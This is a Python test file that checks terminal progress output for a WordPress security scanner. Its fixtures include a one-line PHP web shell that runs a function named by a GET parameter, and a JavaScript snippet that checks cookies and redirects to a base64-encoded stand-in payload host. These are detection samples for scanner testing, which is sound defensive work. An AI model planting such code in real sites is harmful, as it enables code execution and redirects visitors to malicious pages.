#!/usr/bin/env python3
"""PTY regressions for terminal-only progress; no live site or network access."""
import errno
import fcntl
import json
import os
from pathlib import Path
import select
import shutil
import signal
import struct
import subprocess
import tempfile
import termios
import time

REPO = Path(__file__).resolve().parents[1]
PHP = shutil.which('php')
assert PHP
checks = 0


def expect(ok, message):
    global checks
    assert ok, message
    checks += 1


def terminal(args, env, timeout=20):
    """Provide an actual controlling TTY, preserving ordinary pipeline I/O."""
    master, slave = os.openpty()
    fcntl.ioctl(slave, termios.TIOCSWINSZ, struct.pack('HHHH', 24, 80, 0, 0))

    def setup():
        os.setsid()
        fcntl.ioctl(0, termios.TIOCSCTTY, 0)

    proc = subprocess.Popen(args, stdin=slave, stdout=slave, stderr=slave,
                            env=env, preexec_fn=setup, close_fds=True)
    os.close(slave)
    output = bytearray()
    deadline = time.monotonic() + timeout
    try:
        while True:
            if time.monotonic() > deadline:
                raise AssertionError('terminal fixture timed out')
            ready, _, _ = select.select([master], [], [], 0.1)
            if ready:
                try:
                    chunk = os.read(master, 65536)
                except OSError as e:
                    if e.errno == errno.EIO:
                        break
                    raise
                if not chunk:
                    break
                output.extend(chunk)
            elif proc.poll() is not None:
                break
        return proc.wait(timeout=5), output.decode('utf-8', errors='replace')
    finally:
        if proc.poll() is None:
            os.killpg(proc.pid, signal.SIGKILL)
            proc.wait(timeout=5)
        os.close(master)


with tempfile.TemporaryDirectory(prefix='presswarden-progress-test-') as temp:
    base = Path(temp)
    home = base / 'home'
    home.mkdir()
    env = dict(os.environ, HOME=str(home), TERM='xterm', PRESSWARDEN_NOCOLOR='1',
               PRESSWARDEN_CONFIG_FILE=str(base/'absent-config'),
               PRESSWARDEN_STATE_DIR=str(base/'state'), PRESSWARDEN_CACHE_DIR=str(base/'cache'),
               PRESSWARDEN_PROGRESS='auto')
    # Actual PHP renderer: only it knows when processing has successfully ended.
    penv = dict(env, PW_PROGRESS_ACTIVE='1', PW_PROGRESS_TOTAL='100', PW_PROGRESS_WIDTH='79')
    snippet = ('require $argv[1];$p=new PressWardenProgress("PHP");'
               '$p->advance(40,true);$p->advance(41);$p->advance(100,true);$p->finish(100,0);')
    rc, out = terminal([PHP, '-r', snippet, str(REPO/'lib/progress.php')], penv)
    expect(rc == 0, out)
    expect('40% | 40/100 files processed' in out, out)
    expect('41%' not in out, 'progress was not throttled')
    expect('99%' in out and out.index('99%') < out.index('100%'), out)
    expect('100% | 100/100 files processed' in out, out)
    # Clean stdout and error protocols even when a terminal exists.
    wrapper = ('"$PW_PHP" -r \'require $argv[1];$p=new PressWardenProgress("PHP");'
               '$p->advance(50,true);echo "PROTOCOL\\tOK\\n";fwrite(STDERR,"DIAGNOSTIC\\n");'
               '$p->finish(100,0);\' "$PW_LIBRARY" > "$PW_OUT" 2> "$PW_ERR"')
    rc, out = terminal(['bash', '-c', wrapper], dict(penv, PW_PHP=PHP,
                       PW_LIBRARY=str(REPO/'lib/progress.php'), PW_OUT=str(base/'stdout'),
                       PW_ERR=str(base/'stderr')))
    expect(rc == 0 and '50%' in out, out)
    expect((base/'stdout').read_text() == 'PROTOCOL\tOK\n', 'protocol changed')
    expect((base/'stderr').read_text() == 'DIAGNOSTIC\n', 'diagnostics changed')
    rc, out = terminal([PHP, '-r', snippet, str(REPO/'lib/progress.php')],
                       dict(penv, PW_PROGRESS_LIST_COMPLETE='0'))
    expect(rc == 0 and '100%' not in out and 'INCOMPLETE SCOPE' in out, out)
    # Incomplete/mismatched/empty work must not claim a completed 100% scan.
    for total, done, errors in [('2', 2, 1), ('3', 2, 0), ('0', 0, 0), ('bad', 1, 0)]:
        code = ('require $argv[1];$p=new PressWardenProgress("PHP");'
                f'$p->advance({done},true);$p->finish({done},{errors});')
        rc, out = terminal([PHP, '-r', code, str(REPO/'lib/progress.php')],
                           dict(penv, PW_PROGRESS_TOTAL=total))
        expect(rc == 0 and '100%' not in out, out)
        if errors:
            expect('INCOMPLETE' in out, out)
    rc, out = terminal([PHP, '-r', snippet, str(REPO/'lib/progress.php')],
                       dict(penv, PW_PROGRESS_ACTIVE='0'))
    expect(rc == 0 and out == '', 'disabled helper emitted progress')
    # Bounded safe display, including control characters in labels.
    code = ('require $argv[1];$p=new PressWardenProgress("PHP\\033[31m\\n");'
            '$p->advance(10,true);$p->finish(10,0);')
    rc, out = terminal([PHP, '-r', code, str(REPO/'lib/progress.php')],
                       dict(penv, PW_PROGRESS_WIDTH='39'))
    expect(rc == 0 and '\x1b' not in out, 'terminal control injection')
    expect(all(len(part) <= 39 for part in out.replace('\n','').split('\r')), 'unbounded line')
    # Count NUL records without a directory scan or miscounting embedded newlines.
    manifest = base/'candidates'
    manifest.write_bytes(b'/tmp/a\nname.php\0/tmp/another.php\0')
    shell = ('. "$PW_LIB"; pw_progress_init; pw_progress_count_paths "$PW_MANIFEST"; '
             'printf "COUNT=%s\\n" "$PW_PROGRESS_TOTAL"; '
             'pw_progress_collect 0 2 $\'site\\033[31m\\nname\' 1; pw_progress_end')
    rc, out = terminal(['bash', '-c', shell], dict(env, PW_LIB=str(REPO/'lib/progress.sh'),
                       PW_MANIFEST=str(manifest)))
    expect(rc == 0 and 'COUNT=2' in out, out)
    expect('\x1b' not in out and 'site?[31m?name' in out, out)
    # Redirected logs, missing terminal, or TERM=dumb must not require progress.
    for mode in ['auto', '0', '1']:
        result = subprocess.run(['bash', '-c', shell], env=dict(env,
                   PW_LIB=str(REPO/'lib/progress.sh'), PW_MANIFEST=str(manifest),
                   PRESSWARDEN_PROGRESS=mode), capture_output=True, start_new_session=True)
        expect(result.returncode == 0 and result.stdout == b'COUNT=0\n' and not result.stderr,
               'no-terminal command output/status changed')
    # No list read is needed when progress is disabled.
    result = subprocess.run(['bash', '-c', shell], env=dict(env,
               PW_LIB=str(REPO/'lib/progress.sh'), PW_MANIFEST='/nonexistent-progress-list',
               PRESSWARDEN_PROGRESS='0'), capture_output=True, start_new_session=True)
    expect(result.returncode == 0 and not result.stderr, 'disabled progress read the manifest')
    rc, out = terminal(['bash', '-c', shell], dict(env, TERM='dumb',
                       PW_LIB=str(REPO/'lib/progress.sh'), PW_MANIFEST=str(manifest)))
    expect(rc == 0 and out.strip() == 'COUNT=0', out)
    # Use real check / suite / two-tee pipelines on a temporary WordPress layout.
    root = base/'sites'
    site = root/'example.invalid'/'public_html'
    for folder in ['wp-admin', 'wp-includes', 'wp-content']:
        (site/folder).mkdir(parents=True, exist_ok=True)
    (site/'wp-load.php').write_text('<?php // inert fixture\n')
    (site/'wp-settings.php').write_text('<?php // inert fixture\n')
    (site/'wp-includes'/'version.php').write_text('<?php $wp_version="7.1";\n')
    (site/'wp-content'/'sample.php').write_text('<?php $f=$_GET["f"]; $f();\n')
    (site/'wp-content'/'sample.js').write_text('if(document.cookie){const u=atob("aHR0cHM6Ly9wYXlsb2FkLmludmFsaWQveA==");location.href=u;}\n')
    binpath=base/'bin'; binpath.mkdir()
    wp=binpath/'wp'
    wp.write_text('#!/usr/bin/env bash\nprintf "PWDB1\\tDONE\\t0\\t0\\t20\\t2500\\n"\n')
    wp.chmod(0o700)
    env['PATH']=str(binpath)+':'+os.environ['PATH']
    for kind, expected in [('php',1),('js',1),('db',0)]:
        reportdir = base/('reports-'+kind)
        e=dict(env, REPORTS=str(reportdir))
        rc, out = terminal(['bash', str(REPO/'presswarden'), 'inspect', kind, str(root)], e)
        expect(rc == expected, out)
        if kind in ['php','js']:
            expect('100%' in out and 'files processed' in out and 'Collecting files' in out, out)
        else:
            expect('Database: 0% | 0/1 sites processed' in out, out)
        report_files = list(reportdir.glob('*.log'))
        expect(bool(report_files), 'reports missing')
        for report in report_files:
            text=report.read_bytes()
            expect(b'files processed' not in text and b'sites processed' not in text
                   and b'Collecting files' not in text and b'\r' not in text,
                   'progress leaked into saved report: '+report.name)
        latest=json.loads((reportdir/('inspect-'+kind+'-latest-summary.json')).read_text())
        expect(latest['exit_code'] == expected and latest['coverage_status'] == 'complete', latest)
        rc, disabled = terminal(['bash', str(REPO/'presswarden'), 'inspect', kind, str(root)],
                                dict(e,PRESSWARDEN_PROGRESS='0'))
        expect(rc == expected and 'files processed' not in disabled and 'sites processed' not in disabled,
               'disabled scan changed findings/status')
    # Denominator counts attempted files. A validator failure cannot show 100%.
    (site/'wp-content'/'sample.php').write_text('<?php $f=$_GET["f"]; if(true){')
    rc, out=terminal(['bash',str(REPO/'presswarden'),'inspect','php',str(root)],env)
    expect(rc == 2 and 'PHP: INCOMPLETE' in out and 'PHP: 100%' not in out, out)
    # Reporter state must not write source/config contents or new private state.
    expect(not list(base.rglob('presswarden-progress.*')), 'unexpected progress state files')
print(f'Terminal progress: {checks} assertions passed')
